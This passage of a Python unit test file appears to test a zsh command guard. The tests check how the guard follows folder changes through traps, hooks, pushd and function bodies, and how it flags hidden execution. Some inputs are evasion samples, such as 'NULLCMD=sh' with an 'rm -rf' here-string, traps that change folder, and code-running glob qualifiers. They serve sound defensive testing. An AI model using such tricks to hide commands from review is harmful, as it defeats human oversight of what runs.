        r = self.ok("cd /tmp; cd $X && touch y")
        self.assertEqual([c.cwds for c in r.commands if c.prog == "touch"], [[]])

    def test_values_kept(self):
        def touched(cmd):
            cs = [c for c in self.ok(cmd).commands if c.prog == "touch"]
            if len(cs) > 1:  # review 11 M-1: one of a few known values: one reading per value
                return None, sorted(c.words[1].value for c in cs)
            w = self.one(self.ok(cmd), "touch").words[1]
            return w.value, sorted(getattr(w, "cand_values", ()))
        self.assertEqual(touched("X=s; f(){ local X=t }; f; touch $X"), ("s", []))
        self.assertEqual(touched("X=s; [[ -e x ]] && X=t; touch $X"), (None, ["s", "t"]))
        self.assertEqual(touched("X=s; read X < /nonexistent/x; touch $X")[1], ["s"])
        self.assertEqual(touched("X=s; if [[ -e x ]]; then X=t; else X=u; fi; touch $X"), (None, ["t", "u"]))
        self.assertEqual(touched("X=s; : ${X:=t}; touch $X"), (None, ["s", "t"]))
        self.assertEqual(touched("X=s; : ${X::=t}; touch $X"), ("t", []))
        self.assertEqual(touched("X=s; eval true; touch $X"), (None, ["s"]))
        self.assertEqual(touched("X=s; f(){ X=t }; f; touch $X"), ("t", []))
        self.assertEqual(touched("X=s; f(){ [[ -e x ]] && X=t }; f; touch $X"), (None, ["s", "t"]))


class G1Review4(GuardCase):
    """G1 implementation review 4: autoload stubs and other function bodies (B1, m1, m2, conf m-2), hooks (m3, R1),
    pushd and while conditions (R2, R3), NULLCMD (R4), file-name generation and steering under GLOB_SUBST (conf M-1),
    quoted pattern characters (conf M-2)."""

    def setUp(self):
        super().setUp()
        for d in ("a", "src", "studio/local"):
            self.mk(d)
        self.R = lambda *p: os.path.join(self.root, *p)

    def test_function_bodies(self):  # B1, m1, m2, conf m-2
        from stdo.guard import walk
        from stdo.guard.scanctx import ScanCtx
        funcs = '''stub () {
	# undefined
	builtin autoload -XU
}
stubz () {
	# undefined
	builtin autoload -XUz
}
loadx () {
	autoload -X
}
loadplus () {
	autoload +X helper
}
tprint () {
	typeset -p PATH > /dev/null
	PATH=$1:$PATH
}
lprint () {
	local -p HOME > /dev/null
	HOME=$1
}
tmatch () {
	typeset -m 'GIT_*'=x
}
arname () {
	(( $1 = 1 ))
}
arinc () {
	(( $1++ ))
}
arplain () {
	(( n = 1 ))
}
cachekey () {
	typeset -g "_mycache_${1}"=1
}
cachegit () {
	typeset -g "GIT_${1}"=1
}
cacheany () {
	typeset -g "${1}_x"=1
}
'''
        snap = self.use_snapshots(snapshot_text(functions=funcs))
        ctx = ScanCtx(self.env, guard.FS(), snapshot=snap)
        E = lambda n: walk.snapshot_function_effects(ctx, n)
        for n in ("stub", "stubz", "loadx", "tmatch", "arname", "arinc", "cachegit", "cacheany"):
            self.assertIsNone(E(n), n)
        self.assertEqual(E("loadplus")["shadowed"], {"helper"})
        self.assertEqual(E("tprint")["globals"], {"PATH"})
        self.assertEqual(E("lprint")["globals"], {"HOME"})
        self.assertEqual(E("arplain")["globals"], {"n"})
        self.assertEqual(E("cachekey")["globals"], set())

    def test_hooks(self):  # m3, R1
        r = self.ok("chpwd(){ builtin cd -q studio; }; cd a; touch x")
        self.assertEqual(self.one(r, "touch").cwds, [])
        for cmd in ("TRAPDEBUG(){ cd /; }; touch x", "TRAPZERR(){ cd -; }; false; touch x",
                    "chpwd_functions=(f); touch x", "command_not_found_handler(){ cd /; }; touch x",
                    "trap 'cd studio' ZERR; touch x", "trap \"$X\" DEBUG; touch x", "trap 'f' ERR; touch x",
                    "trap 'cd /' INT; touch x", "g(){ cd /; }; trap g USR1; touch x", "trap g INT; g(){ cd /; }; touch x",
                    "g(){ :; }; trap g INT; g(){ cd /; }; touch x", "f(){ trap 'cd /' EXIT; }; f; touch x",
                    "TRAPUSR1(){ cd /; }; touch x"):
            self.assertEqual(self.one(self.ok(cmd), "touch").cwds, [], cmd)
        # review 10 B1/M1: an EXIT trap set at the top, precmd/zshexit (never run between the call's commands), and a
        # hook whose body the guard reads and that does not change folder keep the folder
        for cmd in ("trap 'rm -f /tmp/x' EXIT; touch x", "trap - EXIT; touch x", "trap '' INT; touch x",
                    "trap 'cd /' EXIT; touch x", "TRAPEXIT(){ cd /; }; touch x", "precmd(){ cd /; }; touch x",
                    "zshexit(){ cd /; }; touch x", "precmd_functions+=(f); touch x",
                    "cleanup(){ rm -f /tmp/l; }; trap cleanup EXIT INT TERM; touch x",
                    "TRAPDEBUG(){ :; }; touch x", "command_not_found_handler(){ print -r -- \"$1\"; }; touch x"):
            self.assertEqual(self.one(self.ok(cmd), "touch").cwds, [self.root], cmd)
        base = "show () {\n\tgit status\n}\n"
        self.use_snapshots(snapshot_text(functions=base + "chpwd () {\n\t[[ -d studio ]] && builtin cd -q studio\n}\n"))
        self.assertEqual(self.one(self.ok("cd a; touch x"), "touch").cwds, [])
        self.assertEqual(self.one(self.ok("touch x"), "touch").cwds, [self.root])
        self.use_snapshots(snapshot_text(functions=base + "chpwd () {\n\tprint -r -- moved\n}\n"))
        self.assertEqual(self.one(self.ok("cd a; touch x"), "touch").cwds, [self.R("a")])
        self.use_snapshots(snapshot_text(functions=base + "TRAPDEBUG () {\n\tbuiltin cd -q studio\n}\n"))
        self.assertEqual(self.one(self.ok("touch x"), "touch").cwds, [])

    def test_defined_functions_and_snapshot_functions(self):  # B3
        self.use_snapshots(snapshot_text(functions="show () {\n\tgit status\n}\n"))
        self.assertEqual(self.one(self.ok("show; touch x"), "touch").cwds, [self.root])
        for cmd in ("git(){ cd studio; }; show; touch x", "f(){ :; }; show; touch x",
                    "eval 'git(){ :; }'; show; touch x",
                    "functions[git]='cd studio'; show; touch x", "autoload -Uz f; show; touch x"):
            self.assertEqual(self.one(self.ok(cmd), "touch").cwds, [], cmd)
        self.assertEqual(self.one(self.ok("alias git='cd studio'; show; touch x"), "touch").cwds, [self.root])

    def test_pushd_and_loop_conditions(self):  # R2, R3; a function's `return`
        for cmd in ("pushd -P studio; touch x", "pushd -L studio; touch x", "pushd -s studio; touch x",
                    "pushd -- studio; touch x", "pushd -qP studio; touch x"):
            self.assertEqual(self.one(self.ok(cmd), "touch").cwds, [self.R("studio")], cmd)
        for cmd in ("pushd src studio; touch x", "pushd -z studio; touch x", "while cd studio; do break; done; touch x",
                    "until cd studio; do :; done; touch x", "while ! cd studio; do :; done; touch x",
                    "while { cd studio }; do break; done; touch x"):
            self.assertIsNone(self.one(self.ok(cmd), "touch").cwds or None, cmd)
        # review 10: a function this call defined is walked from where it is called — its folder there
        self.assertEqual(self.one(self.ok("f(){ cd studio; return; }; f; touch x"), "touch").cwds, [self.R("studio")])
        self.assertEqual(self.one(self.ok("while [[ -n $X ]]; do break; done; touch x"), "touch").cwds, [self.root])

    def test_null_command(self):  # R4
        for cmd in ("NULLCMD=sh; > /dev/null <<< 'rm -rf x'", "READNULLCMD=sh; <<< 'rm -rf x'",
                    "NULLCMD=$X; > /dev/null <<< 'rm -rf x'"):
            o = [o for o in self.ok(cmd).opaque if o.kind == "shell-c"]
            self.assertEqual([x.payload for x in o], ["rm -rf x\n"], cmd)
        for cmd in ("> /dev/null <<< 'rm -rf x'", "NULLCMD=cat; > /dev/null <<< 'rm -rf x'", "NULLCMD=sh; > out.txt"):
            self.assertNotIn("shell-c", self.kinds(self.ok(cmd)), cmd)

    def test_steered_values(self):  # conf M-1
        def qual(cmd):
            return any(o.kind == "dynamic-command" and getattr(o, "why", None) for o in self.ok(cmd).opaque)
        for cmd in ("setopt globsubst; ls $X", "setopt globsubst; echo ${#X}", "setopt globsubst; [[ -n $X ]]",
                    "setopt globsubst; local v=$X", "setopt globsubst; typeset -i n=$X", "setopt globsubst; Y=$X",
                    "setopt globsubst; case $X in a) ;; esac", "setopt globsubst; for i in 1 2; do ls $i; done",
                    "setopt globsubst; a=(x y); ls ${a[1]}", "setopt globsubst; cat <<< $X", "eval 'ls'; ls $X",
                    "setopt globsubst; echo ${X:-y}"):
            self.assertFalse(qual(cmd), cmd)
        for cmd in ("setopt globsubst; read X < f; ls $X", "setopt globsubst; for f in *.ts; do ls $f; done",
                    "setopt globsubst; X=$(cat f); ls $X", "eval 'X=y'; setopt globsubst; ls $X",
                    "setopt globsubst; ls $REPLY", "setopt globsubst; ls ${X:-'*(e:x:)'}", "echo $~X",
                    "setopt globsubst; X=$(cat f); a=($X)", "setopt globsubst; f(){ :; }; f; ls $X",
                    "setopt globsubst; ls ${(P)X}"):
            self.assertTrue(qual(cmd), cmd)
        self.assertTrue(qual("setopt globsubst; X='*(e:x:)'; a=($X)"))
        self.assertTrue(self.ok('eval "$O"; ls $X').sourced)  # fix20: the walk stops (the 0.0.26 rules judge it)

    def test_quoted_pattern_characters(self):  # conf M-2
        w = [w for w in self.one(self.ok("touch 'a(1).txt' b\\(2\\).txt c*.txt \"d[1]\"*"), "touch").words[1:]]
        self.assertEqual([sorted(x.wild) for x in w], [[], [0, 2, 4, 5, 6, 7], [0, 1, 2, 3, 4, 5], [4]])
